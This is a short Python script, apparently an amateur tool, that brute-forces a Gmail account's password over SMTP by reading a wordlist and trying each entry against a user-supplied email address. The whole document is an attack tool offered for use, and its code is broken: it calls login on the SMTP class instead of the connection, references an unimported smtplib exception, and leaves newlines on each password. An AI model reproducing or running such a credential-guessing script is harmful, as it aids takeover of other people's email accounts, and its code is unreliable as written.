from smtplib import SMTP
server = SMTP('smtp.gmail.com',587)
server.ehlo()
server.starttls()

emailAddr = input("Enter an email address you wish to brute force")
emailPass = input("Enter a file to load to a wordlist from")
wordList = open(emailPass,'r')

for password in wordList:
    try:
        SMTP.login(emailAddr,password)
        print(" + Password found ---> ", password)
    except smtplib.SMTPAuthenticationError:
        print(" - Password incorrect ---> ", password)
        
